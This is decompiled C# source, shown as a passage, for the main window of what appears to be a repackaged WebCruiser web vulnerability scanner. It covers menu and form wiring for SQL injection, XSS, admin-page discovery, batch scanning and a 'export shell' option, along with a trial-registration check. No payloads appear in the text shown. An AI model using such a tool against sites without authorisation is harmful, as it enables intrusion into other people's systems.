using Microsoft.Win32;
using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using windowsmanger.Properties;
namespace windowsmanger
{
	public class FormMain : Form
	{
		private delegate void dd(string s);
		private delegate void ddd(FormScanner fm);
		private delegate void ddSetTextBox(FormMain.TxtBoxInfo txtBoxInfo);
		private delegate string ds();
		private delegate void EnableTextBox(bool TrueFalse);
		public struct TxtBoxInfo
		{
			public TextBox txtBox;
			public string Text;
		}
		public delegate void DelegateToGetwebsite();
		public delegate void DelegateToScanAdmin();
		public delegate void DelegateToScancms();
		private delegate void SetPos(int ipos);
		private delegate void houtaiSetPos(int ipos);
		private delegate void houtaiSetc(int ipos);
		private delegate void cmsSetPos(int ipos);
		public delegate void DelegateToScanc();
		public delegate void yeshuPiliangZhuru();
		public delegate void Yshupangzhan();
		private FormAbout AboutForm;
		private FormAdmin AdminForm;
		private FormBrowser BrowserForm;
		private FormCode CodeForm;
		private IContainer components;
		private FormCookie CookieForm;
		private RequestType CurrentRequestType;
		public WebSite CurrentSite = new WebSite("");
		private FormReport ReportForm;
		private FormScanner ScannerForm;
		private FormSetting SettingForm;
		private FormSQL SQLForm;
		private string TextAdURL = "";
		private ListBox listBox2;
		private ContextMenuStrip contextMenuStrip2;
		private ToolStripMenuItem 复制ToolStripMenuItem1;
		private ToolStripMenuItem 导出ToolStripMenuItem;
		private TextBox textBox10;
		private Button button10;
		private Label label30;
		private ProgressBar progressBar4;
		private Label label29;
		private Button button20;
		private Panel panel1;
		private Button button9;
		private Button button3;
		private TextBox textBox9;
		private TextBox textBox8;
		private TextBox textBox7;
		private Label label28;
		private Label label27;
		private Label label26;
		private Label label22;
		private ComboBox comboBox2;
		private ListView listView2;
		private ContextMenuStrip contextMenuStrip3;
		private ToolStripMenuItem 打开网址ToolStripMenuItem;
		private ToolStripMenuItem toolStripMenuItem1;
		private ToolStripMenuItem 导出ToolStripMenuItem1;
		private Button button22;
		private Button button24;
		private Button button12;
		private Label label20;
		private TabPage tabPage2;
		private GroupBox groupBox5;
		private Button button11;
		private Button button1;
		private TabPage tabPage1;
		private GroupBox groupBox12;
		private GroupBox groupBox11;
		private Label label33;
		private Label label32;
		private Label label31;
		private GroupBox groupBox1;
		private Button button16;
		private TextBox textBox4;
		private Button button15;
		private Label label9;
		private GroupBox groupBox2;
		private Label label12;
		private Label label11;
		private ListView listView1;
		private ContextMenuStrip contextMenuStrip1;
		private ToolStripMenuItem 打开ToolStripMenuItem1;
		private ToolStripMenuItem 复制ToolStripMenuItem;
		private Label label16;
		private ProgressBar progressBar1;
		private GroupBox groupBox6;
		private Label label14;
		private ComboBox comboBox1;
		private Button button2;
		private Label label1;
		private TextBox textBox1;
		private TextBox textBox3;
		private Button button13;
		private Label label5;
		private Label label4;
		private Button button14;
		private TabPage tabPage9;
		private TabPage tabPage3;
		private Label label2;
		private ProgressBar progressBar2;
		private Label label13;
		private GroupBox groupBox4;
		private ListBox listBox3;
		private ListBox listBox7;
		private GroupBox groupBox7;
		private TabPage tabPage6;
		private GroupBox groupBox10;
		private Label label24;
		private Button button23;
		private GroupBox groupBox9;
		private TextBox textBox6;
		private Label label23;
		private GroupBox groupBox3;
		private TextBox textBox5;
		private Label label21;
		private TabPage tabPage4;
		private ListBox listBox1;
		private ToolStripMenuItem 导出ToolStripMenuItem2;
		private ToolStripMenuItem toolStripMenuItem2;
		private ToolStripMenuItem 打开ToolStripMenuItem;
		private ContextMenuStrip contextMenuStrip4;
		private Label label15;
		private TabPage tabPage5;
		private Button button25;
		private ListView listView3;
		private Button button21;
		private Label label19;
		private Label label18;
		private ProgressBar progressBar3;
		private Button button7;
		private Button button6;
		private Label label10;
		private Button button4;
		private Button button5;
		private TextBox textBox2;
		private Button button8;
		private TabPage tabPage7;
		private GroupBox groupBox8;
		private Button button19;
		private Button button18;
		private Button button17;
		private WebBrowser wb_browser;
		private TabPage tabPage8;
		private Label label25;
		private TabControl tabControl1;
		private SplitContainer splitMain;
		private ImageList WCRImageList;
		private ToolStrip toolStripData;
		private ToolStripLabel lblSubmitData;
		private ToolStripSeparator toolStripSeparator2;
		private ToolStripTextBox txtSubmitData;
		private ToolStripSeparator toolStripSeparator16;
		private ToolStripButton ButtonAutoFill;
		private ToolStrip toolStripURL;
		private ToolStripLabel toolStripLabel1;
		private ToolStripSeparator toolStripSeparator1;
		private ToolStripTextBox txtURL;
		private ToolStripSeparator toolStripSeparator3;
		private ToolStripComboBox cmbReqType;
		private StatusStrip statusStripMain;
		private ToolStripStatusLabel toolStripStatusProgress;
		private ToolStripStatusLabel toolStripStatusSep1;
		private ToolStripStatusLabel lblThreadNum;
		private ToolStrip toolStripMain;
		private ToolStripButton toolStripButtonBrowser;
		private ToolStripButton toolStripButtonScanner;
		private ToolStripSeparator toolStripSeparator10;
		private ToolStripButton toolStripButtonSQL;
		private ToolStripSeparator toolStripSeparator20;
		private ToolStripButton toolStripButtonXSS;
		private ToolStripSeparator toolStripSeparator11;
		private ToolStripButton ButtonCookie;
		private ToolStripSeparator toolStripSeparator17;
		private ToolStripButton ButtonSetting;
		private ToolStripSeparator toolStripSeparator13;
		private ToolStripSeparator toolStripSeparator15;
		private ToolStripButton ButtonScanURL;
		private ToolStripSeparator toolStripSeparator14;
		private ToolStripButton ButtonScanSite;
		private System.Windows.Forms.Timer ScanTimer;
		private System.Windows.Forms.Timer AdTimer;
		private TreeView treeViewToolTree;
		private ToolStripButton toolStripButton1;
		private ToolStripButton toolStripButton2;
		private ToolStripButton toolStripButton4;
		private Label label36;
		private Label label35;
		private Label label34;
		private TabPage tabPage10;
		private Button button27;
		private Button button26;
		private Label label38;
		private Label label37;
		private ListBox listBox6;
		private ListBox listBox5;
		private ListBox listBox4;
		private Button button29;
		private Button button28;
		private ContextMenuStrip contextMenuStrip5;
		private ToolStripMenuItem 复制ToolStripMenuItem2;
		private ToolStripMenuItem 全部导出ToolStripMenuItem;
		private Label label40;
		private TextBox textBox11;
		private Label label39;
		private TextBox textBox12;
		private ContextMenuStrip contextMenuStrip6;
		private ToolStripMenuItem 复制ToolStripMenuItem3;
		private ToolStripMenuItem 导出ToolStripMenuItem3;
		private ComboBox comboBox3;
		private Label label42;
		private GroupBox groupBox13;
		private Label label43;
		private Label label44;
		private ToolStripMenuItem 导出ToolStripMenuItem4;
		private Button button32;
		private ToolStripMenuItem 导出shellToolStripMenuItem;
		private ToolStripMenuItem 导入数据库ToolStripMenuItem;
		private Label label7;
		private Label label6;
		private Label label3;
		private Label label17;
		private Label label8;
		private FormXSS XSSForm;
		private ArrayList urladds = new ArrayList();
		private int cduanzongshu;
		private int cduanjishu;
		private ArrayList List = new ArrayList();
		private int houtaijishu;
		private int houtaijishuzongshu;
		private int gaibian;
		private int jindutiaozongshu = 250;
		private int jindu;
		private int cmsjishu;
		private int cmsjishuzongshu;
		private string localFilePath = "Good.txt";
		private HttpStatusCode normalStatusCode;
		private long normalContentLength;
		private HttpStatusCode StatusCode_11;
		private long ContentLength_11;
		private HttpStatusCode StatusCode_12;
		private long ContentLength_12;
		private string header;
		public RequestType ReqType
		{
			get
			{
				return this.CurrentRequestType;
			}
			set
			{
				this.CurrentRequestType = value;
				this.InitByRequestType(this.CurrentRequestType);
			}
		}
		public string SubmitData
		{
			get
			{
				return this.GetSubmitData();
			}
			set
			{
				this.UpdateSubmitData(value);
			}
		}
		public string URL
		{
			get
			{
				return this.GetCurrentURL();
			}
			set
			{
				this.CurrentSite.URL = value;
				this.UpdateURLText(value);
			}
		}
		public FormMain()
		{
			this.InitializeComponent();
			this.cmbReqType.SelectedIndex = 0;
			this.treeViewToolTree.ExpandAll();
			this.InitForm();
			this.InitSetting();
			this.toolStripURL.ImageList = this.WCRImageList;
			this.InitTextAd();
			Control.CheckForIllegalCrossThreadCalls = false;
			Control.CheckForIllegalCrossThreadCalls = false;
			string peizhi = Settings.Default.HoutaiScan;
			if (peizhi == "1")
			{
				this.label24.Text = "程序已经配置";
			}
			else
			{
				this.label24.Text = "程序没有配置";
			}
			this.listView1.GridLines = true;
			this.listView1.FullRowSelect = true;
			this.listView1.View = View.Details;
			this.listView1.Columns.Add("ID", 40, HorizontalAlignment.Right);
			this.listView1.Columns.Add("地址", 250, HorizontalAlignment.Left);
			this.listView1.Columns.Add("标题", 400, HorizontalAlignment.Left);
			this.listView2.GridLines = true;
			this.listView2.FullRowSelect = true;
			this.listView2.View = View.Details;
			this.listView2.Columns.Add("ID", 90, HorizontalAlignment.Right);
			this.listView2.Columns.Add("地址", 650, HorizontalAlignment.Left);
			this.listView2.Columns.Add("状态", 70, HorizontalAlignment.Left);
			this.listView3.GridLines = true;
			this.listView3.FullRowSelect = true;
			this.listView3.View = View.Details;
			this.listView3.Columns.Add("ID", 40, HorizontalAlignment.Right);
			this.listView3.Columns.Add("地址", 250, HorizontalAlignment.Left);
			this.listView3.Columns.Add("CMS结果", 140, HorizontalAlignment.Left);
			this.listView3.Columns.Add("安全检查或者结果", 400, HorizontalAlignment.Left);
		}
		public void AddItem2ListViewWVS(string Text)
		{
			this.ScannerForm.AddItem2ListViewWVS(Text);
		}
		private void AdTimer_Tick(object sender, EventArgs e)
		{
			try
			{
				string str = this.CurrentSite.GetSourceCode("", RequestType.GET, Encoding.UTF8);
				if (!string.IsNullOrEmpty(str))
				{
					string[] strArray = str.Split(new char[]
					{
						'^'
					});
					this.TextAdURL = strArray[1];
				}
			}
			catch
			{
			}
		}
		private void ButtonAutoFill_Click(object sender, EventArgs e)
		{
			this.BrowserForm.FillInForm(this.txtSubmitData.Text);
		}
		private void ButtonCookie_Click(object sender, EventArgs e)
		{
			this.SelectTool("Cookie");
		}
		private void ButtonResend_Click(object sender, EventArgs e)
		{
			this.SelectTool("Resend");
		}
		private void ButtonScanSite_Click(object sender, EventArgs e)
		{
			this.SelectTool("Scanner");
			this.ScannerForm.ScanCurrentSite();
		}
		private void ButtonScanURL_Click(object sender, EventArgs e)
		{
			this.SelectTool("Scanner");
			this.ScannerForm.ScanCurrentURL();
		}
		private void ButtonTest_Click(object sender, EventArgs e)
		{
		}
		private void CheckRegistration()
		{
			try
			{
				RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Sec4App\\WebCruiser", true);
				if (key == null)
				{
					key = Registry.CurrentUser.CreateSubKey("Software\\Sec4App\\WebCruiser");
					string str = Reg.Encrypt(DateTime.Now.ToString("yyyy-MM-dd"));
					key.SetValue("InitDate", str);
				}
				else
				{
					string str2 = (string)key.GetValue("Username");
					string str3 = (string)key.GetValue("RegCode");
					if (!string.IsNullOrEmpty(str2) && !string.IsNullOrEmpty(str3) && (Reg.ValidateRegCode(str2, str3) || Reg.ValidateRegCode2(str2, str3)))
					{
						Reg.A1K3 = true;
					}
					if (!Reg.A1K3)
					{
						string str4 = (string)key.GetValue("InitDate");
						int days;
						if (string.IsNullOrEmpty(str4))
						{
							days = 30;
						}
						else
						{
							DateTime time = DateTime.ParseExact(Reg.Decrypt(str4), "yyyy-MM-dd", null);
							days = DateTime.Now.Subtract(time).Days;
						}
						Reg.LeftDays = 30 - days;
					}
					this.AboutForm.InitRegControl();
					string str5 = (string)key.GetValue("Edition");
					if (!string.IsNullOrEmpty(str5) && str5.Equals("Debug"))
					{
						WebSite.LogScannedURL = true;
					}
					key.Close();
				}
				if (WCRSetting.UseProxy)
				{
					WCRSetting.RefreshIESettings(WCRSetting.ProxyAddress + ":" + WCRSetting.ProxyPort.ToString());
				}
			}
			catch
			{
				Reg.A1K3 = false;
				this.AboutForm.InitRegControl();
			}
		}
		private void CheckUpdate(object data)
		{
			string strA = Assembly.GetExecutingAssembly().GetName().Version.ToString();
			string sourceCode = this.CurrentSite.GetSourceCode("", RequestType.GET);
			if (!string.IsNullOrEmpty(sourceCode))
			{
				XmlDocument document = new XmlDocument();
				document.LoadXml(sourceCode);
				string strB = document.SelectSingleNode("//ROOT/Version").Attributes["Value"].Value;
				if (string.Compare(strA, strB) >= 0)
				{
					MessageBox.Show("Current version is up-to-date!", "Information", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					return;
				}
				if (MessageBox.Show("Found New Version: " + strB + " , Update Now?", "Information", MessageBoxButtons.OKCancel, MessageBoxIcon.Asterisk) == DialogResult.OK)
				{
					string str4 = "Ent";
					string sURL = document.SelectSingleNode("//ROOT/Download/URL[@Edition=\"" + str4 + "\"]").Attributes["Value"].Value;
					this.NavigatePage(sURL, RequestType.GET, "");
					return;
				}
			}
			else
			{
				this.SelectTool("WebBrowser");
				this.NavigatePage("", RequestType.GET, "");
			}
		}
		private void cmbReqType_DropDownClosed(object sender, EventArgs e)
		{
			if (this.cmbReqType.Text.Equals("GET"))
			{
				this.CurrentRequestType = RequestType.GET;
			}
			else
			{
				if (this.cmbReqType.Text.Equals("POST"))
				{
					this.CurrentRequestType = RequestType.POST;
				}
				else
				{
					if (this.cmbReqType.Text.Equals("COOKIE"))
					{
						this.CurrentRequestType = RequestType.COOKIE;
					}
				}
			}
			this.InitByRequestType(this.CurrentRequestType);
		}
		public void DisplayProgress(string Text)
		{
			if (!this.statusStripMain.InvokeRequired)
			{
				this.toolStripStatusProgress.Text = Text;
				this.statusStripMain.Refresh();
				if (Text.Length > 5)
				{
					WebSite.LogScannedData(Text);
					return;
				}
			}
			else
			{
				FormMain.dd method = new FormMain.dd(this.DisplayProgress);
				base.Invoke(method, new object[]
				{
					Text
				});
			}
		}
		public void DisplayProgressNoLog(string Text)
		{
			if (!this.statusStripMain.InvokeRequired)
			{
				this.toolStripStatusProgress.Text = Text;
				this.statusStripMain.Refresh();
				return;
			}
			FormMain.dd method = new FormMain.dd(this.DisplayProgress);
			base.Invoke(method, new object[]
			{
				Text
			});
		}
		public void DisplayThreadNum(string Text)
		{
			if (!this.statusStripMain.InvokeRequired)
			{
				this.lblThreadNum.Text = Text;
				this.statusStripMain.Refresh();
				return;
			}
			FormMain.dd method = new FormMain.dd(this.DisplayThreadNum);
			base.Invoke(method, new object[]
			{
				Text
			});
		}
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.components != null)
				{
					this.components.Dispose();
				}
				base.Dispose(disposing);
			}
			catch
			{
			}
		}
		public void DisposeSubForm(FormScanner SubForm)
		{
			try
			{
				if (!SubForm.InvokeRequired)
				{
					SubForm.Dispose();
				}
				else
				{
					FormMain.ddd method = new FormMain.ddd(this.DisposeSubForm);
					base.Invoke(method, new object[]
					{
						SubForm
					});
				}
			}
			catch
			{
			}
		}
		public void EnableFunction(bool EnableFunc)
		{
			this.ScannerForm.EnableFunc(EnableFunc);
			this.SQLForm.EnableFunc(EnableFunc);
		}
		private void EnableTxtSubmitData(bool TrueFalse)
		{
			if (!this.toolStripData.InvokeRequired)
			{
				this.toolStripData.Visible = TrueFalse;
				this.txtSubmitData.Width = this.toolStripData.Width - 85;
				return;
			}
			FormMain.EnableTextBox method = new FormMain.EnableTextBox(this.EnableTxtSubmitData);
			base.Invoke(method, new object[]
			{
				TrueFalse
			});
		}
		public void EscapeCookie(bool IsEscape)
		{
		}
		private void exitToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Application.Exit();
		}
		private void FormMain_FormClosing(object sender, FormClosingEventArgs e)
		{
			if (WebSite.MultiProcessNum > 0 && MessageBox.Show("* Multi-Site Scanning Task Is Not Complete.\r\n* Site Number: " + WebSite.MultiProcessNum.ToString() + "\r\n* Continue Exit?\r\n", "Confirm", MessageBoxButtons.OKCancel, MessageBoxIcon.Asterisk) == DialogResult.Cancel)
			{
				e.Cancel = true;
			}
		}
		private void FormMain_Resize(object sender, EventArgs e)
		{
			this.txtURL.Width = this.toolStripMain.Width - 211;
			this.txtSubmitData.Width = this.toolStripData.Width - 85;
			this.toolStripStatusProgress.Width = this.statusStripMain.Width - 150;
		}
		private XmlDocument GetCurrentSiteXml()
		{
			XmlDocument document = new XmlDocument();
			XmlNode newChild = document.CreateXmlDeclaration("1.0", "utf-8", "");
			document.AppendChild(newChild);
			XmlElement element = document.CreateElement("ROOT");
			document.AppendChild(element);
			XmlElement element2 = document.CreateElement("CurrentSite");
			element.AppendChild(element2);
			XmlElement element3 = document.CreateElement("URL");
			element3.SetAttribute("Value", this.CurrentSite.URL);
			element2.AppendChild(element3);
			XmlElement element4 = document.CreateElement("RequestType");
			element4.SetAttribute("Value", this.CurrentRequestType.ToString());
			element2.AppendChild(element4);
			XmlElement element5 = document.CreateElement("SubmitData");
			element5.SetAttribute("Value", this.txtSubmitData.Text);
			element2.AppendChild(element5);
			XmlElement element6 = document.CreateElement("DatabaseType");
			element6.SetAttribute("Value", this.CurrentSite.DatabaseType.ToString());
			element2.AppendChild(element6);
			XmlElement element7 = document.CreateElement("CurrentKeyWord");
			element7.SetAttribute("Value", this.CurrentSite.CurrentKeyWord);
			element2.AppendChild(element7);
			XmlElement element8 = document.CreateElement("CurrentInjType");
			element8.SetAttribute("Value", this.CurrentSite.InjType.ToString());
			element2.AppendChild(element8);
			XmlElement element9 = document.CreateElement("CurrentBlindInjType");
			element9.SetAttribute("Value", this.CurrentSite.BlindInjType.ToString());
			element9.SetAttribute("CurrentFieldEchoIndex", this.CurrentSite.CurrentFieldEchoIndex.ToString());
			element9.SetAttribute("CurrentFieldNum", this.CurrentSite.CurrentFieldNum.ToString());
			element2.AppendChild(element9);
			XmlElement element10 = document.CreateElement("WebRoot");
			element10.SetAttribute("Value", this.CurrentSite.WebRoot);
			element2.AppendChild(element10);
			XmlElement element11 = document.CreateElement("EscapeCookie");
			element11.SetAttribute("Value", WebSite.EscapeCookie.ToString());
			element2.AppendChild(element11);
			return document;
		}
		private string GetCurrentURL()
		{
			if (!this.toolStripMain.InvokeRequired)
			{
				return this.txtURL.Text.Trim();
			}
			FormMain.ds method = new FormMain.ds(this.GetCurrentURL);
			return (string)base.Invoke(method, new object[0]);
		}
		public string GetSourceCodeFromWebBrowser()
		{
			return this.BrowserForm.GetSourceCodeFromWebBrowser();
		}
		private string GetSubmitData()
		{
			if (!this.toolStripData.InvokeRequired)
			{
				return this.txtSubmitData.Text;
			}
			FormMain.ds method = new FormMain.ds(this.GetSubmitData);
			return (string)base.Invoke(method, new object[0]);
		}
		public int GetWCRBrowserFrameNum()
		{
			return this.BrowserForm.GetWCRBrowserFrameNum();
		}
		public string GetWCRBrowserFrameSource(int i)
		{
			return this.BrowserForm.GetWCRBrowserFrameSource(i);
		}
		public string GetWCRBrowserFrameURL(int i)
		{
			return this.BrowserForm.GetWCRBrowserFrameURL(i);
		}
		private void HideAllToolForm()
		{
			this.BrowserForm.Hide();
			this.ScannerForm.Hide();
			this.SQLForm.Hide();
			this.XSSForm.Hide();
			this.CodeForm.Hide();
			this.CookieForm.Hide();
			this.SettingForm.Hide();
			this.AdminForm.Hide();
			this.ReportForm.Hide();
			this.AboutForm.Hide();
		}
		public void InitByInjectionType(InjectionType InjType, string sURL)
		{
			this.SQLForm.InitByInjectionType(InjType, sURL);
		}
		public void InitByRequestType(RequestType ReqType)
		{
			if (ReqType == RequestType.GET)
			{
				this.UpdateComboReqType("GET");
				this.EnableTxtSubmitData(false);
				return;
			}
			if (ReqType == RequestType.POST)
			{
				this.UpdateComboReqType("POST");
				this.EnableTxtSubmitData(true);
				return;
			}
			if (ReqType == RequestType.COOKIE)
			{
				this.UpdateComboReqType("COOKIE");
				this.EnableTxtSubmitData(true);
			}
		}
		private void InitForm()
		{
			this.BrowserForm = new FormBrowser(this);
			this.BrowserForm.MdiParent = this;
			this.splitMain.Panel2.Controls.Add(this.BrowserForm);
			this.BrowserForm.Dock = DockStyle.Fill;
			base.LayoutMdi(MdiLayout.Cascade);
			this.BrowserForm.Show();
			this.ScannerForm = new FormScanner(this);
			this.ScannerForm.MdiParent = this;
			this.splitMain.Panel2.Controls.Add(this.ScannerForm);
			this.ScannerForm.Dock = DockStyle.Fill;
			this.SQLForm = new FormSQL(this);
			this.SQLForm.MdiParent = this;
			this.splitMain.Panel2.Controls.Add(this.SQLForm);
			this.SQLForm.Dock = DockStyle.Fill;
			this.XSSForm = new FormXSS(this);
			this.XSSForm.MdiParent = this;
			this.splitMain.Panel2.Controls.Add(this.XSSForm);
			this.XSSForm.Dock = DockStyle.Fill;
			this.CodeForm = new FormCode(this);
			this.CodeForm.MdiParent = this;
			this.splitMain.Panel2.Controls.Add(this.CodeForm);
			this.CodeForm.Dock = DockStyle.Fill;
			this.CookieForm = new FormCookie(this);
			this.CookieForm.MdiParent = this;
			this.splitMain.Panel2.Controls.Add(this.CookieForm);
			this.CookieForm.Dock = DockStyle.Fill;
			this.SettingForm = new FormSetting();
			this.SettingForm.MdiParent = this;
			this.splitMain.Panel2.Controls.Add(this.SettingForm);
			this.SettingForm.Dock = DockStyle.Fill;
			this.AdminForm = new FormAdmin(this);
			this.AdminForm.MdiParent = this;
			this.splitMain.Panel2.Controls.Add(this.AdminForm);
			this.AdminForm.Dock = DockStyle.Fill;
			this.ReportForm = new FormReport(this);
			this.ReportForm.MdiParent = this;
			this.splitMain.Panel2.Controls.Add(this.ReportForm);
			this.ReportForm.Dock = DockStyle.Fill;
			this.AboutForm = new FormAbout(this);
			this.AboutForm.MdiParent = this;
			this.splitMain.Panel2.Controls.Add(this.AboutForm);
			this.AboutForm.Dock = DockStyle.Fill;
		}
		public void InitFunctionByRegistration(bool RegOK, int LeftDays)
		{
			bool enableFunc = RegOK || LeftDays > 0;
			this.EnableFunction(enableFunc);
		}
		private void InitializeComponent()
		{
			this.components = new Container();
			TreeNode treeNode = new TreeNode("浏览器");
			TreeNode treeNode2 = new TreeNode("漏洞扫描");
			TreeNode treeNode3 = new TreeNode("SQL 注入");
			TreeNode treeNode4 = new TreeNode("XSS脚本");
			TreeNode treeNode5 = new TreeNode("获得管理页面");
			TreeNode treeNode6 = new TreeNode("漏洞利用", new TreeNode[]
			{
				treeNode3,
				treeNode4,
				treeNode5
			});
			TreeNode treeNode7 = new TreeNode("Cookie工具");
			TreeNode treeNode8 = new TreeNode("Code工具");
			TreeNode treeNode9 = new TreeNode("String工具");
			TreeNode treeNode10 = new TreeNode("设置");
			TreeNode treeNode11 = new TreeNode("报表");
			TreeNode treeNode12 = new TreeNode("系统工具", new TreeNode[]
			{
				treeNode7,
				treeNode8,
				treeNode9,
				treeNode10,
				treeNode11
			});
			ComponentResourceManager resources = new ComponentResourceManager(typeof(FormMain));
			this.listBox2 = new ListBox();
			this.contextMenuStrip2 = new ContextMenuStrip(this.components);
			this.复制ToolStripMenuItem1 = new ToolStripMenuItem();
			this.导出ToolStripMenuItem = new ToolStripMenuItem();
			this.textBox10 = new TextBox();
			this.button10 = new Button();
			this.label30 = new Label();
			this.progressBar4 = new ProgressBar();
			this.label29 = new Label();
			this.button20 = new Button();
			this.panel1 = new Panel();
			this.splitMain = new SplitContainer();
			this.treeViewToolTree = new TreeView();
			this.WCRImageList = new ImageList(this.components);
			this.toolStripData = new ToolStrip();
			this.lblSubmitData = new ToolStripLabel();
			this.toolStripSeparator2 = new ToolStripSeparator();
			this.txtSubmitData = new ToolStripTextBox();
			this.toolStripSeparator16 = new ToolStripSeparator();
			this.ButtonAutoFill = new ToolStripButton();
			this.toolStripURL = new ToolStrip();
			this.toolStripLabel1 = new ToolStripLabel();
			this.toolStripSeparator1 = new ToolStripSeparator();
			this.txtURL = new ToolStripTextBox();
			this.toolStripSeparator3 = new ToolStripSeparator();
			this.cmbReqType = new ToolStripComboBox();
			this.toolStripButton1 = new ToolStripButton();
			this.toolStripButton2 = new ToolStripButton();
			this.toolStripButton4 = new ToolStripButton();
			this.statusStripMain = new StatusStrip();
			this.toolStripStatusProgress = new ToolStripStatusLabel();
			this.toolStripStatusSep1 = new ToolStripStatusLabel();
			this.lblThreadNum = new ToolStripStatusLabel();
			this.toolStripMain = new ToolStrip();
			this.toolStripButtonBrowser = new ToolStripButton();
			this.toolStripButtonScanner = new ToolStripButton();
			this.toolStripSeparator10 = new ToolStripSeparator();
			this.toolStripButtonSQL = new ToolStripButton();
			this.toolStripSeparator20 = new ToolStripSeparator();
			this.toolStripButtonXSS = new ToolStripButton();
			this.toolStripSeparator11 = new ToolStripSeparator();
			this.ButtonCookie = new ToolStripButton();
			this.toolStripSeparator17 = new ToolStripSeparator();
			this.ButtonSetting = new ToolStripButton();
			this.toolStripSeparator13 = new ToolStripSeparator();
			this.toolStripSeparator15 = new ToolStripSeparator();
			this.ButtonScanURL = new ToolStripButton();
			this.toolStripSeparator14 = new ToolStripSeparator();
			this.ButtonScanSite = new ToolStripButton();
			this.button9 = new Button();
			this.button3 = new Button();
			this.textBox9 = new TextBox();
			this.textBox8 = new TextBox();
			this.textBox7 = new TextBox();
			this.label28 = new Label();
			this.label27 = new Label();
			this.label26 = new Label();
			this.label22 = new Label();
			this.comboBox2 = new ComboBox();
			this.listView2 = new ListView();
			this.contextMenuStrip3 = new ContextMenuStrip(this.components);
			this.打开网址ToolStripMenuItem = new ToolStripMenuItem();
			this.toolStripMenuItem1 = new ToolStripMenuItem();
			this.导出ToolStripMenuItem1 = new ToolStripMenuItem();
			this.button22 = new Button();
			this.button24 = new Button();
			this.button12 = new Button();
			this.label20 = new Label();
			this.tabPage2 = new TabPage();
			this.groupBox5 = new GroupBox();
			this.button11 = new Button();
			this.button1 = new Button();
			this.tabPage1 = new TabPage();
			this.groupBox12 = new GroupBox();
			this.groupBox11 = new GroupBox();
			this.label36 = new Label();
			this.label35 = new Label();
			this.label34 = new Label();
			this.label33 = new Label();
			this.label32 = new Label();
			this.label31 = new Label();
			this.groupBox1 = new GroupBox();
			this.button16 = new Button();
			this.textBox4 = new TextBox();
			this.button15 = new Button();
			this.label9 = new Label();
			this.groupBox2 = new GroupBox();
			this.label12 = new Label();
			this.label11 = new Label();
			this.listView1 = new ListView();
			this.contextMenuStrip1 = new ContextMenuStrip(this.components);
			this.打开ToolStripMenuItem1 = new ToolStripMenuItem();
			this.复制ToolStripMenuItem = new ToolStripMenuItem();
			this.导出ToolStripMenuItem4 = new ToolStripMenuItem();
			this.label16 = new Label();
			this.progressBar1 = new ProgressBar();
			this.groupBox6 = new GroupBox();
			this.button32 = new Button();
			this.label14 = new Label();
			this.comboBox1 = new ComboBox();
			this.button2 = new Button();
			this.label1 = new Label();
			this.textBox1 = new TextBox();
			this.textBox3 = new TextBox();
			this.button13 = new Button();
			this.label5 = new Label();
			this.label4 = new Label();
			this.button14 = new Button();
			this.tabPage9 = new TabPage();
			this.tabPage3 = new TabPage();
			this.label2 = new Label();
			this.progressBar2 = new ProgressBar();
			this.label13 = new Label();
			this.groupBox4 = new GroupBox();
			this.listBox3 = new ListBox();
			this.listBox7 = new ListBox();
			this.groupBox7 = new GroupBox();
			this.label17 = new Label();
			this.label8 = new Label();
			this.label7 = new Label();
			this.label6 = new Label();
			this.label3 = new Label();
			this.tabPage6 = new TabPage();
			this.groupBox13 = new GroupBox();
			this.label43 = new Label();
			this.groupBox10 = new GroupBox();
			this.label24 = new Label();
			this.button23 = new Button();
			this.groupBox9 = new GroupBox();
			this.textBox6 = new TextBox();
			this.label23 = new Label();
			this.groupBox3 = new GroupBox();
			this.label42 = new Label();
			this.comboBox3 = new ComboBox();
			this.textBox5 = new TextBox();
			this.label21 = new Label();
			this.tabPage4 = new TabPage();
			this.listBox1 = new ListBox();
			this.导出ToolStripMenuItem2 = new ToolStripMenuItem();
			this.toolStripMenuItem2 = new ToolStripMenuItem();
			this.打开ToolStripMenuItem = new ToolStripMenuItem();
			this.contextMenuStrip4 = new ContextMenuStrip(this.components);
			this.导出shellToolStripMenuItem = new ToolStripMenuItem();
			this.导入数据库ToolStripMenuItem = new ToolStripMenuItem();
			this.label15 = new Label();
			this.tabPage5 = new TabPage();
			this.button25 = new Button();
			this.listView3 = new ListView();
			this.button21 = new Button();
			this.label19 = new Label();
			this.label18 = new Label();
			this.progressBar3 = new ProgressBar();
			this.button7 = new Button();
			this.button6 = new Button();
			this.label10 = new Label();
			this.button4 = new Button();
			this.button5 = new Button();
			this.textBox2 = new TextBox();
			this.button8 = new Button();
			this.tabPage7 = new TabPage();
			this.groupBox8 = new GroupBox();
			this.textBox12 = new TextBox();
			this.label40 = new Label();
			this.textBox11 = new TextBox();
			this.label39 = new Label();
			this.button19 = new Button();
			this.button18 = new Button();
			this.button17 = new Button();
			this.wb_browser = new WebBrowser();
			this.tabPage8 = new TabPage();
			this.label44 = new Label();
			this.label25 = new Label();
			this.tabControl1 = new TabControl();
			this.tabPage10 = new TabPage();
			this.button29 = new Button();
			this.button28 = new Button();
			this.button27 = new Button();
			this.button26 = new Button();
			this.label38 = new Label();
			this.label37 = new Label();
			this.listBox6 = new ListBox();
			this.contextMenuStrip5 = new ContextMenuStrip(this.components);
			this.复制ToolStripMenuItem2 = new ToolStripMenuItem();
			this.全部导出ToolStripMenuItem = new ToolStripMenuItem();
			this.listBox5 = new ListBox();
			this.listBox4 = new ListBox();
			this.contextMenuStrip6 = new ContextMenuStrip(this.components);
			this.复制ToolStripMenuItem3 = new ToolStripMenuItem();
			this.导出ToolStripMenuItem3 = new ToolStripMenuItem();
			this.ScanTimer = new System.Windows.Forms.Timer(this.components);
			this.AdTimer = new System.Windows.Forms.Timer(this.components);
			this.contextMenuStrip2.SuspendLayout();
			this.panel1.SuspendLayout();
			this.splitMain.Panel1.SuspendLayout();
			this.splitMain.SuspendLayout();
			this.toolStripData.SuspendLayout();
			this.toolStripURL.SuspendLayout();
			this.statusStripMain.SuspendLayout();
			this.toolStripMain.SuspendLayout();
			this.contextMenuStrip3.SuspendLayout();
			this.tabPage2.SuspendLayout();
			this.groupBox5.SuspendLayout();
